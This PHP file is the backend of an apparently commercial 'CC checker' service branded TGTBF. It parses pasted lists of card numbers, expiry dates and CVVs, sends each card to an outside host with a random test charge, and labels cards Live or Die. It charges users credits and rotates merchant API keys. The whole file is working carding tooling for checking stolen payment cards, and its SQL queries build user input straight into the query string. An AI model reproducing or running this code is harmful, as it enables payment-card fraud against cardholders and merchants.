<?php
session_start();
include('../account/login/auth.php');
error_reporting(0); 
if (empty($_SESSION['email'])) {
echo '{"error":1,"msg":"Lu Free User Gan!"}';
break;
}
$charge = rand(500,900);
$email = $_SESSION['email'];
include('../account/login/auth.php');
                    $email = $_SESSION['email'];
                    $query = "SELECT * FROM user WHERE email='$email'";
                    $exe = mysql_query($query);
                    $no = 1;
                    while($row = mysql_fetch_assoc($exe)){
                        $credits = $row['credits']; 
                        $status = $row['status'];                   
                    }
if ($credits < 5) {
echo '{"error":1,"msg":"Minimum Credits Is 5"}';
break;
}
if ($status == "Free User") {
echo '{"error":1,"msg":"You Are Free User!"}';
break;
}
$email = $_SESSION['email'];
$ccnum1 = $_POST['cclist'].'|';
$ccnum1 = str_replace("Live","",$ccnum1);
$ccnum1 = str_replace("LIVE","",$ccnum1);
if ($ccnum1 == 0) {
header('location: http://tgtbf-checker.us.to');
break;
}
$ccnum1 = str_replace(" ","",$ccnum1);
$potong = str_replace("|","",$ccnum1);
$jumlah = strlen($potong);
$cc = substr($potong, 0, 1);
if ($cc == 4) {
if ($jumlah > 24) {
$num = substr($potong, 0, 16);
$expm = substr($potong, 16, 2);
$expy = substr($potong, 18, 4);
$cvv = substr($potong,22);
}
if ($jumlah < 24) {
$num = substr($potong, 0, 16);
$expm = substr($potong, 16, 2);
$expy = '20'.substr($potong, 18, 2);
$cvv = substr($potong,20);
}
}
if ($cc == 5) {
if ($jumlah > 24) {
$num = substr($potong, 0, 16);
$expm = substr($potong, 16, 2);
$expy = substr($potong, 18, 4);
$cvv = substr($potong,22);
}
if ($jumlah < 24) {
$num = substr($potong, 0, 16);
$expm = substr($potong, 16, 2);
$expy = '20'.substr($potong, 18, 2);
$cvv = substr($potong,20);
}
}
if ($cc == 3) {
if ($jumlah > 24) {
$num = substr($potong, 0, 15);
$expm = substr($potong, 15, 2);
$expy = substr($potong, 17, 4);
$cvv = substr($potong, 21);
}
if ($jumlah < 24) {
$num = substr($potong, 0, 15);
$expm = substr($potong, 15, 2);
$expy = '20'.substr($potong, 17, 2);
$cvv = substr($potong, 19);
}
}
$ccnum = explode('|', $ccnum1);
$format = $num.'|'.$expm.'|'.$expy.'|'.$cvv;
$api2 = mysql_query("SELECT * FROM api WHERE status='1' OR status='2'");
$api3 = mysql_query("SELECT * FROM api WHERE status='1'");
while($apik = mysql_fetch_assoc($api2)){
$api = $apik['api'];
$author = $apik['author'];
$stat = $apik['status'];
}
while($apik1 = mysql_fetch_assoc($api3)){
$api11 = $apik1['api'];
$author22 = $apik1['author'];
$stat33 = $apik1['status'];
}
$hasil = file_get_contents('http://tgtbf-checker.us.to/api/Proccess-Card.php?ccn='.$num.'&ccm='.$expm.'&ccy='.$expy.'&cvv='.$cvv.'&charge='.$charge.'&api='.$api);
$a = json_decode($hasil, true);
$b = $a['status'];
if ($b == 1) {
$aq = mysql_query("UPDATE `user` SET `credits`=credits-2 WHERE email='$email'");
while($row = mysql_fetch_assoc($exe)){
$credits = $row['credits'];                    
}
$credits = $credits-2;
echo '{"error":0,"msg":"<font color=green><b>Live</b></font> | '.$format.' | [CRE:'.$credits.'] [Reason: Approved] | Checked On TGTBF"}';  
break;
} if ($b == 2) {
echo '{"error":2,"msg":"<font color=red><b>Die</b></font> | '.$format.' | [CRE:'.$credits.'] [Reason: Declined] | Checked On TGTBF"}';
break;
} if ($b == 3) {
if ($stat == 1) {
$delapi = mysql_query("UPDATE `api` SET `status`=2 WHERE api='$api'");
$aq2 = mysql_query("UPDATE `user` SET `credits`=credits-20 WHERE email='$author22'");
}
if ($stat == 2) {
$delapi = mysql_query("UPDATE `api` SET `status`=3 WHERE api='$api'");
}
echo '{"error":-1,"msg":"<font color=purple><b>Unknown</b></font> | '.$ccnum1.'"}';
break;
}
if ($stat == 1) {
$delapi = mysql_query("UPDATE `api` SET `status`=2 WHERE api='$api'");
$aq2 = mysql_query("UPDATE `user` SET `credits`=credits-20 WHERE email='$author22'");
}
if ($stat == 2) {
$delapi = mysql_query("UPDATE `api` SET `status`=3 WHERE api='$api'");
}
echo '{"error":-1,"msg":"<font color=purple><b>Unknown</b></font> | '.$ccnum1.'"}';
//echo '{"error":1,"msg":"Merchant Die"}';
break;
?>